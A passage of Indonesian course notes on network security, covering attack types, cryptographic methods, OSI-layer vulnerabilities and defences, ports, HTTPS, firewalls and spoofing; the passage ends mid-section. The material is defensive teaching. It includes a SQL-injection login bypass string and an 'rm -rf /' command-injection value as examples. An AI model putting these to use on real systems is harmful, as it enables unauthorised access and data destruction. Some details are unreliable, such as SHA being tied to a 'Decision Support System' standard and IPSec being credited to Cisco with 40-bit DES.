- **Sniffing**: Secara harafiah berarti mengendus, tentunya dalam hal ini yang diendus adalah pesan (baik yang belum ataupun sudah dienkripsi) dalam suatu saluran komunikasi. Hal ini umum terjadi pada saluran publik yang tidak aman. Sang pengendus dapat merekam pembicaraan yang terjadi.

- **Replay attack**: Jika seseorang bisa merekam pesan-pesan handshake (persiapan komunikasi), ia mungkin dapat mengulang pesan-pesan yang telah direkamnya untuk menipu salah satu pihak.

- **Spoofing**: Penyerang – misalnya Maman – bisa menyamar menjadi Anto. Semua orang dibuat percaya bahwa Maman adalah Anto. Penyerang berusaha meyakinkan pihak-pihak lain bahwa tak ada salah dengan komunikasi yang dilakukan, padahal komunikasi itu dilakukan dengan sang penipu/penyerang. Contohnya jika orang memasukkan PIN ke dalam mesin ATM palsu – yang benar-benar dibuat seperti ATM asli – tentu sang penipu bisa mendapatkan PIN-nya dan copy pita magenta kartu ATM milik sang nasabah. Pihak bank tidak tahu bahwa telah terjadi kejahatan.

- **Man-in-the-middle**: Jika spoofing terkadang hanya menipu satu pihak, maka dalam skenario ini, saat Anto hendak berkomunikasi dengan Badu, Maman di mata Anto seolah-olah adalah Badu, dan Maman dapat pula menipu Badu sehingga Maman seolah-olah adalah Anto. Maman dapat berkuasa penuh atas jalur komunikasi ini, dan bisa membuat berita fitnah.

## 3.8 Metode Kriptografi

### 3.8.1 Metode Kuno

#### a. Scytale (475 S.M. - Bangsa Sparta)

Bangsa Sparta, suatu bangsa militer pada jaman Yunani kuno, menggunakan teknik kriptografi yang disebut scytale, untuk kepentingan perang. Scytale terbuat dari tongkat dengan papyrus yang mengelilinginya secara spiral. Kunci dari scytale adalah diameter tongkat yang digunakan oleh pengirim harus sama dengan diameter tongkat yang dimiliki oleh penerima pesan, sehingga pesan yang disembunyikan dalam papyrus dapat dibaca dan dimengerti oleh penerima.

#### b. Caesar Cipher (Julius Caesar - 60 S.M.)

Julius Caesar, seorang kaisar terkenal Romawi yang menaklukkan banyak bangsa di Eropa dan Timur Tengah juga menggunakan suatu teknik kriptografi yang sekarang disebut Caesar cipher untuk berkorespondensi sekitar tahun 60 S.M. Teknik yang digunakan oleh Sang Caesar adalah mensubstitusikan alfabet secara beraturan, yaitu oleh alfabet ketiga yang mengikutinya, misalnya, alfabet "A" digantikan oleh "D", "B" oleh "E", dan seterusnya.

### 3.8.2 Metode Modern

#### a. Digital Certificate Server (DCS)
- Verifikasi untuk digital signature
- Autentikasi user
- Menggunakan public dan private key
- Contoh: Netscape Certificate Server

#### b. IP Security (IPSec)
- Enkripsi public/private key
- Dirancang oleh CISCO System
- Menggunakan DES 40-bit dan authentication
- Built-in pada produk CISCO
- Solusi tepat untuk Virtual Private Network (VPN) dan Remote Network Access

#### c. Secure Shell (SSH)
- Digunakan untuk client side authentication antara 2 sistem
- Mendukung UNIX, Windows, OS/2
- Melindungi telnet dan ftp (file transfer protocol)

#### d. Secure Socket Layer (SSL)
- Dirancang oleh Netscape
- Menyediakan enkripsi RSA pada layer session dari model OSI
- Independen terhadap service yang digunakan
- Melindungi system secure web e-commerce
- Metode public/private key dan dapat melakukan authentication
- Terintegrasi dalam produk browser dan web server Netscape

#### e. Security Token
- Aplikasi penyimpanan password dan data user di smart card

#### f. Simple Key Management for Internet Protocol (SKIP)
- Seperti SSL bekerja pada level session model OSI
- Menghasilkan key yang static, mudah bobol

#### g. MD5
- Dirancang oleh Prof. Robert Rivest (RSA, MIT) tahun 1991
- Menghasilkan 128-bit digest
- Cepat tapi kurang aman

#### h. Secure Hash Algorithm (SHA)
- Dirancang oleh National Institute of Standard and Technology (NIST) USA
- Bagian dari standar DSS (Decision Support System) USA dan bekerja sama dengan DES untuk digital signature
- SHA-1 menyediakan 160-bit message digest
- Versi: SHA-256, SHA-384, SHA-512 (terintegrasi dengan AES)

#### i. RSA Encryption
- Dirancang oleh Rivest, Shamir, Adleman tahun 1977
- Standar de facto dalam enkripsi public/private key
- Didukung oleh Microsoft, Apple, Novell, Sun, Lotus
- Mendukung proses authentication
- Multi platform

#### j. Remote Access Dial-in User Service (RADIUS)
- Multiple remote access device menggunakan 1 database untuk authentication
- Didukung oleh 3Com, CISCO, Ascend
- Tidak menggunakan encryption

#### k. Point to Point Tunneling Protocol (PPTP), Layer Two Tunneling Protocol (L2TP)
- Dirancang oleh Microsoft
- Authentication berdasarkan PPP (Point to Point Protocol)
- Enkripsi berdasarkan algoritma Microsoft (tidak terbuka)
- Terintegrasi dengan NOS Microsoft (NT, 2000, XP)

#### l. Kerberos
- Solusi untuk user authentication
- Dapat menangani multiple platform/system
- Free charge (open source)
- IBM menyediakan versi komersial: Global Sign On (GSO)

#### m. Advanced Encryption Standard (AES)
- Untuk menggantikan DES (launching akhir 2001)
- Menggunakan variable length block cipher
- Key length: 128-bit, 192-bit, 256-bit
- Dapat diterapkan untuk smart card.¹¹

---

## 4.1 Model OSI (Open Systems Interconnection)

### Definisi Model OSI

![alt text](https://assets.bytebytego.com/diagrams/0049-top-network-security-cheatsheet.png)

Model OSI (Open Systems Interconnection) adalah model referensi yang menggambarkan bagaimana data dikomunikasikan antar sistem dalam jaringan komputer. Model ini terdiri dari 7 lapisan (layer) yang masing-masing memiliki fungsi spesifik dalam proses komunikasi data. Model OSI dikembangkan oleh International Organization for Standardization (ISO) untuk memastikan bahwa produk jaringan dari berbagai vendor dapat saling berinteraksi.

Setiap layer dalam model OSI memiliki tanggung jawab tersendiri dan berkomunikasi dengan layer di atas dan di bawahnya. Pendekatan berlapis (layered approach) ini memungkinkan:
- Modularitas dalam desain sistem jaringan
- Kemudahan dalam troubleshooting dan pemeliharaan
- Interoperabilitas antar sistem yang berbeda
- Fleksibilitas dalam penambahan fitur baru

---

## 4.2 OSI Layer 7 (Application Layer)

### 4.2.1 Pengertian Application Layer

**Application Layer** (Layer 7) adalah lapisan tertinggi dalam model OSI yang berfungsi sebagai antarmuka langsung antara pengguna dengan sistem komputer dan aplikasi jaringan. Layer ini menangani semua aspek yang diperlukan oleh aplikasi pengguna untuk berkomunikasi melalui jaringan.

Fungsi utama Application Layer:
- Menyediakan layanan jaringan kepada aplikasi pengguna
- Melakukan proses enkripsi dan dekripsi data (jika diperlukan)
- Menerjemahkan format data agar dapat dipahami oleh sistem lain
- Menangani masalah kompresi dan dekompresi data
- Mengontrol dialog dan sinkronisasi komunikasi antar aplikasi
- Menyediakan layanan-layanan seperti email, file transfer, web browsing, dan sebagainya

### 4.2.2 Contoh Protokol pada Application Layer

**Protokol Komunikasi:**
1. **HTTP (HyperText Transfer Protocol)** - Untuk web browsing
2. **HTTPS (HTTP Secure)** - Web browsing dengan enkripsi SSL/TLS
3. **FTP (File Transfer Protocol)** - Transfer file antar komputer
4. **SFTP (SSH File Transfer Protocol)** - Transfer file yang aman
5. **SMTP (Simple Mail Transfer Protocol)** - Pengiriman email
6. **POP3 (Post Office Protocol 3)** - Penerimaan email
7. **IMAP (Internet Message Access Protocol)** - Penerimaan dan manajemen email
8. **DNS (Domain Name System)** - Resolusi nama domain ke IP address
9. **Telnet** - Remote login ke sistem lain
10. **SSH (Secure Shell)** - Remote login yang aman
11. **SNMP (Simple Network Management Protocol)** - Manajemen jaringan
12. **DHCP (Dynamic Host Configuration Protocol)** - Alokasi IP address dinamis
13. **Telnet** - Remote terminal
14. **LDAP (Lightweight Directory Access Protocol)** - Akses direktori
15. **NTP (Network Time Protocol)** - Sinkronisasi waktu jaringan

### 4.2.3 Contoh Perangkat pada Application Layer

**Software/Aplikasi:**
- Web Browsers (Chrome, Firefox, Safari, Edge)
- Email Clients (Outlook, Thunderbird, Gmail)
- FTP Clients (FileZilla, WinSCP)
- SSH Clients (PuTTY, OpenSSH)
- VoIP Applications (Skype, Teams, Zoom)
- Instant Messaging (WhatsApp, Telegram, Discord)
- Remote Desktop Applications (RDP, VNC)
- Web Servers (Apache, Nginx, IIS)
- Mail Servers (Postfix, Sendmail, Exchange)
- DNS Servers (BIND, Windows DNS)
- Proxy Servers (Squid, Nginx Reverse Proxy)

### 4.2.4 Celah Keamanan pada Application Layer

#### 1. **SQL Injection**
- **Deskripsi**: Penyerang menyisipkan kode SQL berbahaya melalui input form untuk memanipulasi database.
- **Contoh**: Memasukkan `' OR '1'='1` di field login untuk bypass autentikasi.
- **Dampak**: Pencurian data, modifikasi database, penghapusan data.

#### 2. **Cross-Site Scripting (XSS)**
- **Deskripsi**: Penyerang menyisipkan script JavaScript berbahaya yang dijalankan di browser korban.
- **Tipe**:
  - Stored XSS: Script disimpan di server
  - Reflected XSS: Script direfleksikan langsung ke user
  - DOM-based XSS: Script memanipulasi DOM di browser
- **Dampak**: Pencurian cookie/session, credential theft, malware infection.

#### 3. **Cross-Site Request Forgery (CSRF)**
- **Deskripsi**: Penyerang memaksa user untuk melakukan aksi tidak sengaja pada website lain.
- **Contoh**: User login ke bank, kemudian membuka link berbahaya yang mengubah password.
- **Dampak**: Perubahan data tanpa sepengetahuan user, transaksi tidak sah.

#### 4. **Authentication & Authorization Flaws**
- **Deskripsi**: Kelemahan dalam proses autentikasi dan otorisasi.
- **Contoh**: Password lemah, session hijacking, privilege escalation.
- **Dampak**: Akses tanpa hak ke sistem dan data sensitif.

#### 5. **Buffer Overflow**
- **Deskripsi**: Program menerima input lebih besar dari kapasitas buffer.
- **Dampak**: Crash program, remote code execution.

#### 6. **Command Injection**
- **Deskripsi**: Penyerang menyisipkan perintah sistem melalui input aplikasi.
- **Contoh**: `; rm -rf /` di input file.
- **Dampak**: Eksekusi perintah berbahaya pada sistem.

#### 7. **Insecure Deserialization**
- **Deskripsi**: Aplikasi mendeserialisasi data yang tidak terpercaya.
- **Dampak**: Remote code execution, arbitrary object creation.

#### 8. **XML External Entity (XXE)**
- **Deskripsi**: Parsing XML yang tidak aman memungkinkan akses file lokal.
- **Dampak**: Pembukaan file sensitif, denial of service.

#### 9. **Broken Access Control**
- **Deskripsi**: Aplikasi tidak menerapkan kontrol akses dengan benar.
- **Dampak**: User dapat mengakses resource yang tidak seharusnya.

#### 10. **Sensitive Data Exposure**
- **Deskripsi**: Data sensitif tidak dienkripsi atau dilindungi dengan baik.
- **Dampak**: Pencurian informasi pribadi, fraud.

#### 11. **Using Components with Known Vulnerabilities**
- **Deskripsi**: Menggunakan library, framework, atau software dengan bug security yang sudah dikenal.
- **Dampak**: Serangan melalui vulnerability yang sudah diketahui.

#### 12. **Insufficient Logging and Monitoring**
- **Deskripsi**: Aplikasi tidak mencatat atau memantau aktivitas mencurigakan.
- **Dampak**: Serangan tidak terdeteksi, investigasi sulit dilakukan.

---

## 4.3 Perlindungan per Layer OSI

### Layer 1 - Physical Layer

**Celah Keamanan:**
- Wiretapping (penyadapan kabel)
- Physical theft dari perangkat
- Interference dan jamming sinyal

**Perlindungan:**
- Penguncian ruangan server dengan akses terbatas
- Cable shielding dan grounding yang baik
- CCTV dan security systems di data center
- Biometric access control untuk ruangan penting
- Pemisahan fisik kabel data dari kabel listrik

---

### Layer 2 - Data Link Layer

**Celah Keamanan:**
- ARP Spoofing (Address Resolution Protocol spoofing)
- MAC Flooding
- VLAN Hopping
- Switch spoofing

**Perlindungan:**
- Implementasi Port Security pada switches
- Dynamic ARP Inspection (DAI)
- DHCP Snooping
- Private VLANs
- MAC Address filtering
- Spanning Tree Protocol (STP) protection

---

### Layer 3 - Network Layer

**Celah Keamanan:**
- IP Spoofing
- Denial of Service (DoS/DDoS)
- Man-in-the-Middle (MITM) attacks
- Routing attacks
- Ping of Death

**Perlindungan:**
- Firewall stateful dengan packet filtering
- Access Control Lists (ACLs)
- Ingress filtering dan Egress filtering
- IP reputation filtering
- Anti-DDoS solutions
- IPSec encryption
- Virtual Private Network (VPN)
- Rate limiting dan traffic shaping

---

### Layer 4 - Transport Layer

**Celah Keamanan:**
- TCP/UDP port scanning
- SYN Flood attacks
- UDP Flood attacks
- TCP sequence number prediction
- Port hijacking

**Perlindungan:**
- Firewall dengan Deep Packet Inspection (DPI)
- TCP sequence number randomization
- Connection timeout settings
- Rate limiting per connection
- Load balancing untuk DDoS mitigation
- TLS/SSL untuk enkripsi transport
- Stateful firewall inspection

---

### Layer 5 - Session Layer

**Celah Keamanan:**
- Session hijacking
- Session fixation
- Session prediction
- Eavesdropping pada session
- Replay attacks

**Perlindungan:**
- SSL/TLS for session encryption
- Secure session tokens
- Session timeout dan re-authentication
- Secure cookie flags (HttpOnly, Secure, SameSite)
- HTTPS untuk enkripsi session
- Session IDs yang random dan unpredictable
- Logout functionality yang proper
- Two-factor authentication (2FA)

---

### Layer 6 - Presentation Layer

**Celah Keamanan:**
- Data format manipulation
- Compression-based attacks (CRIME, BREACH)
- Encryption bypass melalui format manipulation
- Encoding attacks (UTF-8, Unicode)

**Perlindungan:**
- Strong encryption algorithms (AES-256)
- Proper data encoding dan validation
- Input validation pada layer 7
- Disable compression pada sensitive data
- Regular security updates untuk codec
- SSL/TLS 1.3 atau lebih tinggi
- Certificate pinning
- Data integrity checking (HMAC)

---

### Layer 7 - Application Layer

**Celah Keamanan:**
- SQL Injection
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Authentication bypass
- Authorization flaws
- Buffer overflow
- Command injection
- Insecure deserialization
- XXE attacks
- Broken access control
- Sensitive data exposure
- Zero-day vulnerabilities

**Perlindungan:**

**Coding Level:**
- Input validation dan sanitization
- Parameterized queries untuk SQL
- Output encoding untuk XSS prevention
- CSRF tokens
- Secure password hashing (bcrypt, PBKDF2, Argon2)
- Proper error handling (jangan expose sistem info)
- Secure coding practices
- Code review dan static analysis
- Dependency scanning untuk vulnerable components
- Use security libraries dan frameworks

**Authentication & Authorization:**
- Strong password policies
- Multi-factor authentication (MFA/2FA)
- OAuth 2.0 dan OpenID Connect
- Session management yang aman
- Role-based access control (RBAC)
- Attribute-based access control (ABAC)
- Least privilege principle
- Regular access review

**Data Protection:**
- Encryption at rest (AES-256)
- Encryption in transit (TLS 1.3)
- Tokenization untuk data sensitif
- Data masking di logging
- PII (Personally Identifiable Information) protection
- Data classification dan handling

**Monitoring & Logging:**
- Web Application Firewall (WAF)
- Intrusion Detection System (IDS)
- Intrusion Prevention System (IPS)
- Security Information and Event Management (SIEM)
- Application logging untuk security events
- Real-time alerting untuk suspicious activities
- Log analysis dan forensics

**Maintenance & Updates:**
- Regular security patches dan updates
- Vulnerability assessments dan penetration testing
- Security scanning tools (OWASP ZAP, Burp Suite)
- Static Application Security Testing (SAST)
- Dynamic Application Security Testing (DAST)
- Software Composition Analysis (SCA)
- Secure configuration management
- Security training untuk developers

**Standards & Compliance:**
- Mengikuti OWASP Top 10
- Implementasi security standards (ISO 27001, NIST)
- Regular security audits
- Compliance testing
- Incident response procedures

---

## 4.4 Tabel Ringkasan OSI Layer dan Keamanan

| Layer | Nama | Fungsi | Perlindungan Utama |
|-------|------|--------|-------------------|
| 1 | Physical | Transmisi fisik sinyal | Physical security, cable protection |
| 2 | Data Link | Frame delivery | Port security, ARP protection, VLAN security |
| 3 | Network | Routing dan packet delivery | Firewall, ACLs, IPSec, VPN |
| 4 | Transport | End-to-end connection | Firewall stateful, TLS/SSL, rate limiting |
| 5 | Session | Session management | SSL/TLS, session timeout, 2FA |
| 6 | Presentation | Data encoding dan encryption | Strong encryption, certificate pinning |
| 7 | Application | User applications dan services | Input validation, WAF, secure coding, logging |

---

## 5.1 TCP/IP Protocol Suite, Port, dan Service

### 5.1.1 Pengertian TCP/IP

TCP/IP (Transmission Control Protocol/Internet Protocol) adalah model referensi jaringan yang terdiri dari beberapa protokol untuk komunikasi data. Model TCP/IP lebih sederhana dari OSI dengan hanya 4 layer:

1. **Application Layer** - HTTP, HTTPS, FTP, DNS, SMTP, etc.
2. **Transport Layer** - TCP (reliable), UDP (unreliable)
3. **Internet Layer** - IP (IPv4, IPv6)
4. **Link Layer** - Ethernet, PPP

### 5.1.2 Pengertian Port

**Port** adalah nomor logis (0-65535) yang digunakan untuk mengidentifikasi proses atau layanan pada suatu komputer dalam jaringan. Setiap protokol aplikasi menggunakan port tertentu sebagai titik akses untuk komunikasi.

**Rentang Port:**
- **0-1023**: Well-known ports (reserved untuk sistem dan layanan standar)
- **1024-49151**: Registered ports (untuk layanan umum dan aplikasi)
- **49152-65535**: Dynamic/Private ports (untuk aplikasi sementara dan private)

### 5.1.3 Contoh Well-Known Ports dan Service

| Port | Protokol | Service | Deskripsi |
|------|----------|---------|-----------|
| 20 | FTP | File Transfer Data | Transmisi data FTP |
| 21 | FTP | File Transfer Control | Kontrol FTP |
| 22 | SSH | Secure Shell | Remote login aman |
| 23 | Telnet | Remote Login | Remote login tanpa enkripsi |
| 25 | SMTP | Email Send | Pengiriman email |
| 53 | DNS | Domain Name System | Resolusi nama domain |
| 80 | HTTP | Web | Browsing web tanpa enkripsi |
| 110 | POP3 | Email Receive | Penerimaan email |
| 143 | IMAP | Email Receive | Penerimaan dan manajemen email |
| 161 | SNMP | Network Management | Manajemen jaringan |
| 162 | SNMP Trap | Network Management | Notifikasi jaringan |
| 389 | LDAP | Directory Access | Akses direktori |
| 443 | HTTPS | Secure Web | Browsing web dengan enkripsi |
| 465 | SMTPS | Secure Email | Pengiriman email terenkripsi |
| 636 | LDAPS | Secure LDAP | LDAP dengan enkripsi |
| 993 | IMAPS | Secure IMAP | IMAP dengan enkripsi |
| 995 | POP3S | Secure POP3 | POP3 dengan enkripsi |
| 3389 | RDP | Remote Desktop | Remote desktop Windows |
| 5900 | VNC | Virtual Network Computing | Remote desktop cross-platform |
| 8080 | HTTP Alt | Alternate Web | Web alternatif |

### 5.1.4 TCP vs UDP

#### TCP (Transmission Control Protocol)
- **Connection-oriented**: Harus membuka koneksi terlebih dahulu (3-way handshake)
- **Reliable**: Menjamin data sampai dengan urutan yang benar
- **Flow control**: Mengatur kecepatan pengiriman data
- **Error checking**: Memeriksa kesalahan data
- **Overhead**: Lebih berat karena proses yang kompleks
- **Contoh penggunaan**: HTTP, HTTPS, FTP, SMTP, SSH, Telnet

#### UDP (User Datagram Protocol)
- **Connectionless**: Mengirim data langsung tanpa koneksi
- **Unreliable**: Tidak menjamin data sampai atau urutan
- **No flow control**: Mengirim data dengan kecepatan maksimal
- **Minimal error checking**: Hanya checksum dasar
- **Low overhead**: Lebih ringan dan cepat
- **Contoh penggunaan**: DNS, DHCP, SNMP, VoIP, Streaming

---

## 5.2 HTTP vs HTTPS

### 5.2.1 HTTP (HyperText Transfer Protocol)

**Karakteristik:**
- **Port**: 80
- **Keamanan**: Tidak ada enkripsi
- **Koneksi**: Tidak persisten (setiap request baru membuka koneksi baru di HTTP/1.0)
- **Format data**: Plain text yang dapat dibaca oleh siapa saja
- **Authentikasi**: Tidak ada mekanisme authentikasi bawaan
- **Cara kerja**: Client mengirim request, server mengirim response

**Kelemahan HTTP:**
- Data dapat disadap (sniffing)
- Data dapat diubah (man-in-the-middle attacks)
- Password dan informasi sensitif terlihat jelas
- Tidak ada verifikasi identitas server
- Rentan terhadap phishing dan spoofing

**Struktur HTTP Request:**
```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html
```

**Struktur HTTP Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234
Date: Mon, 23 May 2024 22:38:34 GMT

<html>...</html>
```

### 5.2.2 HTTPS (HyperText Transfer Protocol Secure)

**Karakteristik:**
- **Port**: 443
- **Keamanan**: Menggunakan SSL/TLS untuk enkripsi
- **Koneksi**: Persisten dengan keep-alive
- **Format data**: Terenkripsi (tidak dapat dibaca tanpa kunci)
- **Authentikasi**: Menggunakan digital certificate untuk verifikasi server
- **Cara kerja**: Sama seperti HTTP tetapi data dienkripsi

**Keuntungan HTTPS:**
- Data terenkripsi end-to-end
- Integritas data terjamin
- Authentikasi server dengan certificate
- Tidak bisa disadap atau diubah
- Aman untuk data sensitif (password, pembayaran, dll)
- Dilindungi dari MITM attacks

**Proses HTTPS (SSL/TLS Handshake):**

1. **ClientHello**: Client mengirim versi SSL/TLS yang didukung, cipher suites
2. **ServerHello**: Server memilih SSL/TLS version dan cipher suite
3. **Server Certificate**: Server mengirim digital certificate
4. **Server Key Exchange**: Server mengirim kunci untuk key exchange
5. **Server Hello Done**: Server mengindikasikan handshake selesai
6. **Client Key Exchange**: Client mengirim pre-master secret terenkripsi
7. **Change Cipher Spec**: Kedua pihak mulai menggunakan enkripsi
8. **Finished**: Handshake selesai, komunikasi dimulai

**Contoh HTTP vs HTTPS dalam komunikasi:**

**HTTP (Plain text):**
```
Client → Server: GET /login HTTP/1.1
Client → Server: username=admin&password=secret123
Server → Client: 200 OK
```
⚠️ Password terlihat jelas jika disadap!

**HTTPS (Encrypted):**
```
Client → Server: [TLS Encrypted] GET /login HTTP/1.1
Client → Server: [TLS Encrypted] username=admin&password=secret123
Server → Client: [TLS Encrypted] 200 OK
```
✅ Password terenkripsi dengan AES-256!

### 5.2.3 Perbedaan HTTP dan HTTPS

| Aspek | HTTP | HTTPS |
|-------|------|-------|
| Port | 80 | 443 |
| Enkripsi | Tidak | Ya (SSL/TLS) |
| Authentikasi | Tidak | Ya (Certificate) |
| Integritas | Tidak | Ya (HMAC) |
| Kecepatan | Lebih cepat | Sedikit lebih lambat (overhead enkripsi) |
| Keamanan | Rendah | Tinggi |
| Penggunaan | Halaman publik | Data sensitif, login, pembayaran |
| Sertifikat | Tidak diperlukan | Diperlukan |

---

## 5.3 Konsep Firewall dan Segmentasi Jaringan

### 5.3.1 Pengertian Firewall

**Firewall** adalah sistem keamanan jaringan yang berfungsi sebagai barrier (penghalang) antara jaringan internal (trusted) dan jaringan eksternal (untrusted) untuk mengontrol lalu lintas data berdasarkan rules dan policies yang telah ditentukan.

**Fungsi Firewall:**
- Memfilter paket data masuk dan keluar
- Mengontrol akses berdasarkan protokol, port, dan IP address
- Mencegah akses tidak sah ke sistem internal
- Mencatat aktivitas jaringan untuk monitoring
- Melindungi dari serangan DoS/DDoS
- Mengenkripsi komunikasi (pada firewall tertentu)

### 5.3.2 Jenis-jenis Firewall

#### 1. **Packet-Filtering Firewall**
- **Cara kerja**: Memeriksa header paket (IP, port, protokol)
- **Keputusan**: Allow atau Deny berdasarkan rules sederhana
- **Keuntungan**: Cepat, overhead rendah
- **Kelemahan**: Tidak melihat isi paket, mudah bypass

**Contoh rule:**
```
Allow TCP from 192.168.1.0/24 to 10.0.0.0/8 port 443
Deny TCP from any to any port 23
```

#### 2. **Stateful Firewall**
- **Cara kerja**: Melacak state koneksi (established, new, related)
- **Keputusan**: Memeriksa apakah paket bagian dari koneksi yang diketahui
- **Keuntungan**: Lebih aman, mengerti konteks koneksi
- **Kelemahan**: Lebih kompleks, overhead lebih tinggi

#### 3. **Application Layer Firewall (WAF)**
- **Cara kerja**: Memeriksa isi paket pada layer aplikasi
- **Keputusan**: Memahami protokol aplikasi (HTTP, FTP, dll)
- **Keuntungan**: Dapat mendeteksi serangan aplikasi (SQL injection, XSS)
- **Kelemahan**: Overhead tinggi, kompleks

#### 4. **Next-Generation Firewall (NGFW)**
- **Fitur**: Kombinasi stateful + application awareness + IDS/IPS + threat intelligence
- **Keuntungan**: Perlindungan komprehensif
- **Kelemahan**: Mahal, kompleks

### 5.3.3 Firewall Rules Best Practices

**Prinsip Least Privilege:**
```
# Deny all traffic by default (implicit deny)
Deny All

# Allow only necessary traffic
Allow TCP from 192.168.1.0/24 to 10.0.0.0/8 port 443
Allow TCP from 192.168.1.0/24 to 10.0.0.0/8 port 80
Allow UDP from 192.168.1.0/24 to 8.8.8.8 port 53
```

### 5.3.4 Segmentasi Jaringan (Network Segmentation)

**Pengertian**: Membagi jaringan menjadi beberapa subnet atau zone dengan tingkat keamanan berbeda untuk membatasi risiko penyebaran serangan.

**Tujuan Segmentasi:**
- Mengisolasi sistem yang penting
- Membatasi lateral movement attacker
- Meningkatkan performa jaringan
- Memudahkan monitoring dan kontrol
- Memenuhi compliance dan regulasi

**Contoh Segmentasi Jaringan:**

```
┌─────────────────────────────────────────────────┐
│                   Internet                       │
└──────────────────────┬──────────────────────────┘
                       │
                  ┌────▼────┐
                  │ Firewall │
                  └────┬─────┘
                       │
        ┌──────────────┼──────────────┐
        │              │              │
    ┌───▼───┐      ┌──▼──┐      ┌───▼───┐
    │  DMZ  │      │Core │      │Client │
    │ Zone  │      │Zone │      │ Zone  │
    └───┬───┘      └──┬──┘      └───┬───┘
        │             │             │
   Web Server     Database      Desktop/
   Mail Server    Server        Laptop
```

**Zona Jaringan:**

#### **DMZ (Demilitarized Zone)**
- Berisi server yang accessible dari internet
- Contoh: Web server, mail server, DNS server
- Firewall strict antara DMZ dan internal network

#### **Internal Network (Core Zone)**
- Berisi sistem kritis dan sensitif
- Contoh: Database server, file server, domain controller
- Akses terbatas hanya dari authorized systems

#### **Client Zone**
- Berisi workstation dan user devices
- Akses ke internet dan internal services sesuai policies
- Implementasi endpoint security

#### **Guest Zone** (opsional)
- Terpisah untuk visitor dan temporary access
- Tidak boleh mengakses internal resources
- Limited bandwidth dan monitoring

**Implementasi Segmentasi:**
- **VLAN (Virtual Local Area Network)**: Logical segmentation
- **Subnet**: Physical atau logical division
- **Firewall rules**: Control traffic antar zone
- **Access control**: Restrict berdasarkan user dan device

---

## 5.4 Pengenalan Spoofing dan Sniffing Traffic Network

### 5.4.1 Pengertian Spoofing

**Spoofing** adalah teknik penyerangan di mana attacker menyamar sebagai entitas yang terpercaya (user, sistem, atau device) untuk membodohi target agar menerima data atau mengeksekusi perintah.

### 5.4.2 Jenis-jenis Spoofing

#### 1. **IP Spoofing**
- **Definisi**: Attacker mengirim paket dengan source IP palsu
- **Cara kerja**: Memodifikasi header IP untuk meniru IP address yang legitimate
- **Dampak**: MITM attacks, DoS attacks, masking attacker identity
- **Contoh**: Attacker mengirim paket seolah-olah dari server terpercaya

**Ilustrasi IP Spoofing:**
```
Normal flow:
Client (192.168.1.1) → Server (10.0.0.1)

IP Spoofing:
Attacker (malah mengirim dari spoofed source: 10.0.0.5 → Server)
Seolah-olah datang dari trusted IP
```

**Perlindungan IP Spoofing:**
- **Ingress filtering**: Filter paket dengan source IP tidak valid
- **Egress filtering**: Jangan allow paket dengan source IP lokal keluar ke internet
- **RFC 2827 implementation**: Best practices untuk filtering
- **IPSEC**: Authentikasi source dengan encryption

#### 2. **ARP Spoofing**
- **Definisi**: Attacker mengirim ARP reply palsu untuk memetakan IP address ke MAC address yang salah
- **Cara kerja**: Attacker mengirim "ARP is-at" message dengan MAC addressnya sendiri
- **Dampak**: MITM attacks, session hijacking, DoS
- **Contoh**: Attacker mengatakan gateway berada di MAC addressnya

**Ilustrasi ARP Spoofing:**
```
Normal ARP:
Client: "Siapa yang memiliki 10.0.0.1?"
Gateway: "Itu aku, MAC: AA:BB:CC:DD:EE:FF"

ARP Spoofing:
Client: "Siapa yang memiliki 10.0.0.1?"
Attacker: "Itu aku, MAC: 11:22:33:44:55:66"
Sekarang traffic client diroute ke attacker!
```

**Perlindungan ARP Spoofing:**
- **Static ARP entries**: Manual mapping untuk server penting
- **ARP monitoring tools**: Deteksi perubahan ARP yang mencurigakan
- **Dynamic ARP Inspection (DAI)**: Switch menverifikasi ARP messages
- **Encryption**: IPSEC atau SSL/TLS
- **VLAN separation**: Isolasi devices di VLAN terpisah

#### 3. **DNS Spoofing (DNS Cache Poisoning)**
- **Definisi**: Attacker memodifikasi DNS reply untuk mengarahkan ke website palsu
- **Cara kerja**: Inject false DNS record ke DNS cache
- **Dampak**: Phishing, malware distribution, MITM
- **Contoh**: User mengetik "www.bank.com" tapi diarahkan ke attacker website

**Ilustrasi DNS Spoofing:**
```
Normal DNS:
User: "IP address untuk www.bank.com?"
DNS Server: "216.58.217.206"

DNS Spoofing:
User: "IP address untuk www.bank.com?"
Attacker (intercept): "192.168.1.100" (malicious IP)
User diarahkan ke fake bank website
```

**Perlindungan DNS Spoofing:**
- **DNSSEC**: Cryptographic validation DNS responses
- **DNS filtering**: Block malicious domains
- **Trusted DNS servers**: Gunakan public DNS terpercaya
- **Monitor DNS queries**: Deteksi unusual DNS requests

#### 4. **Email Spoofing**
- **Definisi**: Attacker mengirim email seolah-olah dari legitimate sender
- **Cara kerja**: Modifikasi "From" header dalam SMTP
- **Dampak**: Phishing, social engineering, malware distribution
- **Contoh**: Email dari "ceo@company.com" yang sebenarnya dari attacker

**Perlindungan Email Spoofing:**
- **SPF (Sender Policy Framework)**: List authorized mail servers
- **DKIM (DomainKeys Identified Mail)**: Digital signature pada email
- **DMARC (Domain-based Message Authentication)**: Policy untuk SPF/DKIM
- **Email filtering**: Deteksi suspicious emails
- **User awareness training**: Edukasi mengenali email palsu

#### 5. **MAC Spoofing**
- **Definisi**: Attacker memodifikasi MAC address network interface
- **Cara kerja**: Ubah MAC address device ke MAC address lain
- **Dampak**: Bypass MAC filtering, network access control bypass
- **Contoh**: Connect ke network dengan MAC address yang whitelisted

**Perlindungan MAC Spoofing:**
- **Port Security**: Limit dan lock MAC addresses per port
- **Network Access Control (NAC)**: Verify device identity dan security posture
- **802.1X**: Port-based authentication
- **DHCP snooping**: Monitor DHCP transactions

---

### 5.4.3 Pengertian Sniffing (Packet Sniffing)

**Sniffing** adalah teknik menangkap dan menganalisis paket data yang melewati jaringan untuk ekstraksi informasi sensitif.

### 5.4.4 Jenis-jenis Sniffing

#### 1. **Passive Sniffing**
- **Definisi**: Sniffing di shared network (hub, wireless)
- **Cara kerja**: Network interface dalam promiscuous mode
- **Keuntungan attacker**: Tidak terdeteksi dengan mudah
- **Target**: Switched network lebih sulit, wireless lebih mudah

```
Attacker -----> Network Card (promiscuous mode)
              |
              ├─→ Capture all traffic
              └─→ Analyze packets offline
```

#### 2. **Active Sniffing**
- **Definisi**: Sniffing di switched network dengan teknik aktif
